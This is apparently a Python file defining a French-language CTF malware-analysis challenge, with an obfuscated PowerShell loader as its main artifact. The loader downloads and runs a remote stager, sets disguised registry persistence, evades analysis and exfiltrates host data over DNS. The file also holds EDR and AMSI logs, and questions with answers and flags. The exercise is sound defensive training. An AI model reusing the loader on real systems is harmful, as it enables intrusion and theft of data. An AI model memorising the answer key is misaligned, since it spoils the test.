"""
Challenge 6 ‚Äî Analyse de Script Malveillant (PowerShell Obfusqu√©)
Niveau : 2 (Analyste Confirm√©)
Cat√©gorie : Malware
"""

ARTIFACT_MALWARE_SCRIPT = r"""
# Fichier r√©cup√©r√©: C:\Users\j.martin\AppData\Local\Temp\update_checker.ps1
# SHA256: 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b
# Taille: 2,847 bytes
# Date de modification: 2026-02-18 08:33:45

# --- D√©but du script ---

Set-Variable -Name 'x0' -Value ([char[]](83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116) -join '')
Set-Variable -Name 'x1' -Value ([char[]](68,111,119,110,108,111,97,100,83,116,114,105,110,103) -join '')
Set-Variable -Name 'x2' -Value ([char[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) -join '')

$enc_url = "aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC9zdGFnZXIucHMx"
$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc_url))

$wc = New-Object $x0
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.Headers.Add("X-Request-ID", "REDPAWN-WKS-COMPTA-PC03")
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

$payload = $wc.$x1($url)

# Persistence via registre
$rpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$rname = "GoogleChromeAutoUpdate"
$rvalue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:LOCALAPPDATA\Temp\update_checker.ps1`""
Set-ItemProperty -Path $rpath -Name $rname -Value $rvalue -ErrorAction SilentlyContinue

# Anti-analyse
$checks = @(
    (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|VirtualBox",
    (Get-Process | Where-Object {$_.ProcessName -match "wireshark|procmon|x64dbg|ida"}).Count -gt 0,
    (Get-WmiObject Win32_BIOS).SerialNumber -eq "0"
)

if ($checks -contains $true) {
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Collecte d'informations
$info = @{
    "hostname" = $env:COMPUTERNAME
    "username" = $env:USERNAME
    "domain"   = $env:USERDOMAIN
    "os"       = (Get-WmiObject Win32_OperatingSystem).Caption
    "ip"       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne "Loopback"}).IPAddress
    "av"       = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct).displayName
    "admins"   = (net localgroup Administrators) -join ","
}

$json = $info | ConvertTo-Json -Compress
$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$encoded = [Convert]::ToBase64String($bytes)

# Exfiltration via DNS
$chunks = [regex]::Matches($encoded, '.{1,63}')
foreach ($chunk in $chunks) {
    try {
        Resolve-DnsName -Name "$($chunk.Value).data.c2-update-service.xyz" -Type TXT -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
}

# Ex√©cution du stage 2
& $x2 $payload

# --- Fin du script ---
"""

ARTIFACT_EDR_PROCESS_TREE = r"""
=== EDR CrowdStrike ‚Äî Process Tree ‚Äî WKS-COMPTA-PC03 ===
=== Sensor ID: CS-WKS-003 ‚Äî Detection: APT.PhantomLoader ===
=== Timestamp: 2026-02-18 08:28:00 ‚Üí 08:45:00 ===

Process Tree:
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
[PID 4120] EXCEL.EXE (j.martin)
  ‚îú‚îÄ‚îÄ Started: 08:27:45 | SHA256: [Microsoft Office - l√©gitime]
  ‚îú‚îÄ‚îÄ File opened: C:\Users\j.martin\Downloads\Facture_Fevrier2026.xlsm
  ‚îÇ
  ‚îî‚îÄ‚îÄ [PID 6732] cmd.exe (j.martin)
      ‚îú‚îÄ‚îÄ Started: 08:28:11 | ALERT: Child process from Office application!
      ‚îú‚îÄ‚îÄ CmdLine: cmd.exe /c powershell.exe -ep bypass -w hidden -e SQBFAFgA...
      ‚îÇ
      ‚îî‚îÄ‚îÄ [PID 7844] powershell.exe (j.martin)
          ‚îú‚îÄ‚îÄ Started: 08:28:12
          ‚îú‚îÄ‚îÄ CmdLine: powershell.exe -ep bypass -w hidden -e SQBFAFgAKABO...
          ‚îú‚îÄ‚îÄ Modules loaded: System.Net, System.Text.Encoding
          ‚îÇ
          ‚îú‚îÄ‚îÄ [NETWORK] DNS query: c2-update-service.xyz ‚Üí 185.234.72.19
          ‚îú‚îÄ‚îÄ [NETWORK] TCP connect: 185.234.72.19:8080 (HTTP GET /stager.ps1)
          ‚îú‚îÄ‚îÄ [NETWORK] Response: 200 OK (12,456 bytes)
          ‚îÇ
          ‚îú‚îÄ‚îÄ [REGISTRY] SET: HKCU\...\Run\GoogleChromeAutoUpdate
          ‚îú‚îÄ‚îÄ [WMI] Query: Win32_ComputerSystem (anti-VM check)
          ‚îú‚îÄ‚îÄ [WMI] Query: Win32_BIOS (anti-VM check)
          ‚îú‚îÄ‚îÄ [PROCESS] Enumerate processes (anti-analysis check)
          ‚îÇ
          ‚îú‚îÄ‚îÄ [NETWORK] DNS query: *.data.c2-update-service.xyz (TXT)
          ‚îÇ   ‚îú‚îÄ‚îÄ 08:33:45 ‚Äî eyJob3N0bm... .data.c2-update-service.xyz
          ‚îÇ   ‚îú‚îÄ‚îÄ 08:33:46 ‚Äî FtZSI6IldL... .data.c2-update-service.xyz
          ‚îÇ   ‚îú‚îÄ‚îÄ 08:33:48 ‚Äî S1MtQ09NUF... .data.c2-update-service.xyz
          ‚îÇ   ‚îî‚îÄ‚îÄ [+14 more DNS queries over 28 seconds]
          ‚îÇ
          ‚îî‚îÄ‚îÄ [PID 8920] powershell.exe (j.martin) ‚Äî STAGE 2
              ‚îú‚îÄ‚îÄ Started: 08:34:00
              ‚îú‚îÄ‚îÄ CmdLine: IEX (downloaded stager content)
              ‚îú‚îÄ‚îÄ [FILE] Write: C:\Users\j.martin\AppData\Local\Temp\update_checker.ps1
              ‚îÇ
              ‚îú‚îÄ‚îÄ [PROCESS] whoami ‚Üí redpawn\j.martin
              ‚îú‚îÄ‚îÄ [PROCESS] hostname ‚Üí WKS-COMPTA-PC03
              ‚îú‚îÄ‚îÄ [PROCESS] ipconfig /all ‚Üí 10.0.3.45
              ‚îú‚îÄ‚îÄ [PROCESS] net user /domain ‚Üí [liste des comptes]
              ‚îú‚îÄ‚îÄ [PROCESS] net localgroup Administrators ‚Üí j.martin, admin.rsi
              ‚îÇ
              ‚îî‚îÄ‚îÄ [NETWORK] HTTPS beacon: 185.234.72.19:443
                  ‚îú‚îÄ‚îÄ Interval: ~60s | Jitter: 5%
                  ‚îú‚îÄ‚îÄ User-Agent: Mozilla/5.0 ...
                  ‚îú‚îÄ‚îÄ Header: X-Session-ID (session beacon)
                  ‚îî‚îÄ‚îÄ Status: ACTIVE (dernier beacon 08:44:55)

=== D√âTECTIONS CROWDSTRIKE ===
Severity: CRITICAL
Tactic: Execution, Persistence, Discovery, C2
Detection Name: SuspiciousOfficeChildProcess
  ‚Üí Excel lance cmd.exe ‚Üí powershell.exe (IOA: Macro execution)
Detection Name: SuspiciousDnsQuery
  ‚Üí Requ√™tes DNS TXT vers domaine .xyz avec donn√©es encod√©es base64
Detection Name: RegistryRunKeyModified
  ‚Üí Cl√© Run modifi√©e par processus PowerShell non sign√©
Detection Name: EncodedCommandExecution
  ‚Üí PowerShell avec param√®tre -e (encod√©) lanc√© depuis cmd.exe
"""

ARTIFACT_AMSI_LOG = r"""
=== AMSI (Anti-Malware Scan Interface) ‚Äî Capture ===
=== WKS-COMPTA-PC03 ‚Äî 18/02/2026 08:28-08:35 ===

[AMSI Scan 1] 08:28:12
  ContentName: PowerShell_stdin
  AppName: powershell.exe (PID 7844)
  Content (decoded -e parameter, first 500 chars):
    IEX(New-Object Net.WebClient).DownloadString('http://185.234.72.19:8080/stager.ps1')
  Result: AMSI_RESULT_DETECTED ‚Üí Blocked by Defender? NO (exclusion path active)
  Note: Real-time protection a une exclusion sur C:\Users\*\AppData\Local\Temp\

[AMSI Scan 2] 08:33:45
  ContentName: update_checker.ps1
  AppName: powershell.exe (PID 8920)
  Content (first 500 chars):
    Set-Variable -Name 'x0' -Value ([char[]](83,121,115,...) -join '')
    Set-Variable -Name 'x1' -Value ([char[]](68,111,119,...) -join '')
    Set-Variable -Name 'x2' -Value ([char[]](73,110,118,...) -join '')
    $enc_url = "aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC9zdGFnZXIucHMx"
  Result: AMSI_RESULT_NOT_DETECTED
  Note: L'obfuscation par [char[]] bypass l'AMSI ‚Äî les strings malveillantes
        ne sont jamais en clair dans le script
"""

CHALLENGE = {
    "id": "c06_malware_script",
    "title": "ü¶† Le Faux Google Update",
    "category": "malware",
    "level": 2,
    "points_total": 530,
    "estimated_time": "40-60 min",
    "story": """
## üìã Briefing de Mission

**Date :** 18 f√©vrier 2026, 15h00  
**Priorit√© :** HAUTE  
**Source :** Corr√©lation investigation ‚Äî T√¢che planifi√©e suspecte (SIEM-2026-4401)

---

En investiguant l'alerte de la t√¢che planifi√©e suspecte sur **WKS-COMPTA-PC03**, l'analyste N2 a r√©cup√©r√© le script PowerShell ex√©cut√© par la t√¢che.

Le script utilise plusieurs techniques d'obfuscation. Vous disposez √©galement de l'arbre de processus captur√© par l'EDR CrowdStrike et des logs AMSI pour comprendre le contexte d'ex√©cution.

> *"On a r√©cup√©r√© le payload PowerShell de la t√¢che planifi√©e 'GoogleUpdate'. C'est obfusqu√© mais pas trop. Je t'ai aussi sorti l'arbre de processus du CrowdStrike et les captures AMSI. Analyse le script, corr√®le avec le process tree, et explique-moi pourquoi l'AMSI n'a pas d√©tect√© le script, pourquoi Defender n'a rien fait, et quels sont tous les IoC."*

<details>
<summary>üí° Indice technique (cliquez pour afficher)</summary>

Les valeurs num√©riques dans les `[char[]]` sont des codes ASCII. Vous pouvez les convertir pour comprendre le contenu obfusqu√©.

</details>
    """,
    "artifacts": [
        {
            "name": "update_checker.ps1",
            "type": "code",
            "content": ARTIFACT_MALWARE_SCRIPT,
            "description": "Script PowerShell malveillant r√©cup√©r√© depuis WKS-COMPTA-PC03"
        },
        {
            "name": "edr_process_tree.txt",
            "type": "edr",
            "content": ARTIFACT_EDR_PROCESS_TREE,
            "description": "Arbre de processus CrowdStrike ‚Äî cha√Æne d'ex√©cution compl√®te"
        },
        {
            "name": "amsi_capture.txt",
            "type": "log",
            "content": ARTIFACT_AMSI_LOG,
            "description": "Captures AMSI (Anti-Malware Scan Interface) ‚Äî d√©tection/bypass"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "D√©codez la variable $x0 (les codes ASCII). Quelle classe .NET est utilis√©e pour le t√©l√©chargement ?",
            "answer": "System.Net.WebClient",
            "flag": "REDPAWN{System.Net.WebClient}",
            "points": 40,
            "hints": [
                "Convertissez les codes ASCII : 83=S, 121=y, 115=s, 116=t, ...",
                "C'est une classe .NET tr√®s utilis√©e pour faire des requ√™tes HTTP"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "D√©codez l'URL C2 encod√©e en Base64 ($enc_url). Quelle est l'URL compl√®te ?",
            "answer": "http://185.234.72.19:8080/stager.ps1",
            "flag": "REDPAWN{http://185.234.72.19:8080/stager.ps1}",
            "points": 50,
            "hints": [
                "D√©codez la cha√Æne Base64 'aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC9zdGFnZXIucHMx'",
                "Utilisez : echo 'aHR0cDov...' | base64 -d"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Sous quel nom la persistence est-elle configur√©e dans le registre ?",
            "answer": "GoogleChromeAutoUpdate",
            "flag": "REDPAWN{GoogleChromeAutoUpdate}",
            "points": 40,
            "hints": [
                "Cherchez la cl√© de registre Run dans le script",
                "Elle imite une mise √† jour automatique d'un navigateur"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Quels 4 outils d'analyse le script d√©tecte-t-il pour son anti-analyse ? (s√©par√©s par des virgules, par ordre alphab√©tique)",
            "answer": "ida,procmon,wireshark,x64dbg",
            "flag": "REDPAWN{ida,procmon,wireshark,x64dbg}",
            "points": 50,
            "hints": [
                "Cherchez le Get-Process avec un -match dans la section anti-analyse",
                "Ce sont des outils de reverse engineering et d'analyse r√©seau/syst√®me"
            ],
            "hint_cost": 17
        },
        {
            "id": "q5",
            "text": "Quel domaine est utilis√© pour l'exfiltration DNS ?",
            "answer": "c2-update-service.xyz",
            "flag": "REDPAWN{c2-update-service.xyz}",
            "points": 50,
            "hints": [
                "Cherchez Resolve-DnsName dans le script",
                "Le domaine est dans la partie .data.DOMAINE"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Dans l'arbre de processus EDR, quel est le PID du processus parent qui lance toute la cha√Æne d'attaque ?",
            "answer": "4120",
            "flag": "REDPAWN{4120}",
            "points": 40,
            "hints": [
                "Quel est le premier processus dans l'arbre ? Celui qui ouvre le fichier Excel",
                "C'est EXCEL.EXE"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "Quel fichier a √©t√© ouvert par Excel pour d√©clencher l'infection ? (nom complet avec extension)",
            "answer": "Facture_Fevrier2026.xlsm",
            "flag": "REDPAWN{Facture_Fevrier2026.xlsm}",
            "points": 30,
            "hints": [
                "Regardez 'File opened' sous EXCEL.EXE dans le process tree"
            ],
            "hint_cost": 10
        },
        {
            "id": "q8",
            "text": "Pourquoi l'AMSI n'a-t-il PAS d√©tect√© le script update_checker.ps1 ? (technique d'√©vasion)",
            "answer": "obfuscation par char",
            "flag": "REDPAWN{obfuscation}",
            "points": 50,
            "hints": [
                "Regardez le r√©sultat AMSI Scan 2 et sa note explicative",
                "Les strings malveillantes ne sont jamais en clair gr√¢ce √† [char[]]"
            ],
            "hint_cost": 17
        },
        {
            "id": "q9",
            "text": "Pourquoi Windows Defender n'a-t-il pas bloqu√© l'ex√©cution initiale malgr√© la d√©tection AMSI ?",
            "answer": "exclusion path",
            "flag": "REDPAWN{exclusion}",
            "points": 50,
            "hints": [
                "Regardez la note du AMSI Scan 1",
                "Il y a une exclusion de real-time protection sur un chemin utilisateur"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "La variable $x2 d√©obfusqu√©e correspond √† quel cmdlet PowerShell ?",
            "answer": "Invoke-Expression",
            "flag": "REDPAWN{Invoke-Expression}",
            "points": 40,
            "hints": [
                "D√©codez les codes ASCII: 73=I, 110=n, 118=v, 111=o, ...",
                "C'est le cmdlet le plus dangereux de PowerShell, utilis√© pour ex√©cuter du code dynamique"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Quel intervalle de beaconing (en secondes) est visible dans le process tree EDR ?",
            "answer": "60",
            "flag": "REDPAWN{60}",
            "points": 30,
            "hints": [
                "Regardez les d√©tails du beacon HTTPS en bas du process tree"
            ],
            "hint_cost": 10
        },
        {
            "id": "q12",
            "text": "Quelle information identifiant la victime est envoy√©e dans le header HTTP X-Request-ID ?",
            "answer": "REDPAWN-WKS-COMPTA-PC03",
            "flag": "REDPAWN{REDPAWN-WKS-COMPTA-PC03}",
            "points": 30,
            "hints": [
                "Cherchez X-Request-ID dans les headers ajout√©s au WebClient"
            ],
            "hint_cost": 10
        }
    ]
}
